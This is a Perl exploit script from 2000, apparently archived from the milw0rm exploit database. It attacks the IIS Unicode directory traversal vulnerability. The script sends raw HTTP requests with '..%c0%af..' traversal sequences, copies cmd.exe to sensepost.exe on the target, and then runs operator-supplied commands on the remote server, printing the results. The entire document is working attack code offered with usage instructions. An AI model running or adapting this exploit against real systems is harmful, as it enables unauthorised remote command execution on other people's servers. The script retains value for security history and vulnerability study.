#!/usr/bin/perl
#
# See http://www.securityfocus.com/vdb/bottom.html?section=exploit&vid=1806
#
# Very simple PERL script to execute commands on IIS Unicode vulnerable servers
# Use port number with SSLproxy for testing SSL sites
# Usage: unicodexecute2 IP:port command
# Only makes use of "Socket" library
#
# New in version2:
# Copy the cmd.exe to something else, and then use it.
# The script checks for this.
# Thnx to security@nsfocus.com for discovering the cmd.exe copy part
#
# Roelof Temmingh 2000/10/26
# roelof@sensepost.com http://www.sensepost.com

use Socket;
# --------------init
if ($#ARGV<1) {die "Usage: unicodexecute IP:port command\n";}
($host,$port)=split(/:/,@ARGV[0]);
$target = inet_aton($host);

# --------------test if cmd has been copied:
$failed=1;
$command="dir";
@results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /sensepost.exe/) {$failed=0;}
}
$failed2=1;
if ($failed==1) { 
  print "Sensepost.exe not found - Copying CMD...\n";
  $command="copy c:\\winnt\\system32\\cmd.exe sensepost.exe";
  $command=~s/ /\%20/g;
  @results2=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2){
    if (($line2 =~ /copied/ )) {$failed2=0;}
  }
  if ($failed2==1) {die "Copy of CMD failed - inspect manually:\n@results2\n\n"};
} 

# ------------ we can assume that the cmd.exe is copied from here..
$command=@ARGV[1];
print "Sensepost.exe found - Executing [$command] on $host:$port\n";
$command=~s/ /\%20/g;
my @results=sendraw("GET /scripts/..%c0%af../inetpub/scripts/sensepost.exe?/c+$command HTTP/1.0\r\n\r\n");
print @results;

# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway
  my ($pstr)=@_;
  socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
    die("Socket problems\n");
  if(connect(S,pack "SnA4x8",2,$port,$target)){
    my @in;
    select(S);      $|=1;   print $pstr;
    while(<S>){ push @in, $_;}
    select(STDOUT); close(S); return @in;
    } else { die("Can't connect...\n"); }
}
# Spidermark: sensepostdata


# milw0rm.com [2000-11-18]
